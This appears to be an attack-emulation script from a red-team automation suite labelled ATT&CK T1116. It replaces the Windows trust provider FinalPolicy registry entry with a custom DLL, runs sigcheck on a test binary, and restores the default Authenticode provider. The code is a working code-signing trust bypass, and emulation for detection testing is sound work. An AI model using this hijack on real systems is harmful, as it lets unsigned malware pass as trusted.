# Name: Trust Provider Modification
# rta: trust_provider.py
# ATT&CK: T1116
# Description: Substitutes an invalid code authentication policy, enabling trust policy bypass.

import os
import _winreg as winreg
import common

FINAL_POLICY_KEY = "Software\\Microsoft\\Cryptography\\providers\\trust\\FinalPolicy\\{00AAC56B-CD44-11D0-8CC2-00C04FC295EE}"


def set_final_policy(dll_path, function_name):
    hKey = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, FINAL_POLICY_KEY)

    common.log("Setting dll path: %s" % dll_path)
    winreg.SetValueEx(hKey, "$DLL", 0, winreg.REG_SZ, dll_path)

    common.log("Setting function name: %s" % function_name)
    winreg.SetValueEx(hKey, "$Function", 0, winreg.REG_SZ, function_name)


if common.is_64bit():
    SIGCHECK = common.get_path("bin", "sigcheck64.exe")
    TRUST_PROVIDER_DLL = common.get_path("bin", "TrustProvider64.dll")
else:
    SIGCHECK = common.get_path("bin", "sigcheck.exe")
    TRUST_PROVIDER_DLL = common.get_path("bin", "TrustProvider32.dll")


TARGET_APP = common.get_path("bin", "myapp.exe")


@common.dependencies(SIGCHECK, TRUST_PROVIDER_DLL, TARGET_APP)
def main():
    common.log("Trust Provider")
    set_final_policy(TRUST_PROVIDER_DLL, "FinalPolicy")

    common.log("Launching sigcheck")
    common.execute([SIGCHECK, "-accepteula", TARGET_APP])

    common.log("Cleaning up")
    set_final_policy("C:\\Windows\\System32\\WINTRUST.dll", "SoftpubAuthenticode")


if __name__ == "__main__":
    exit(main())
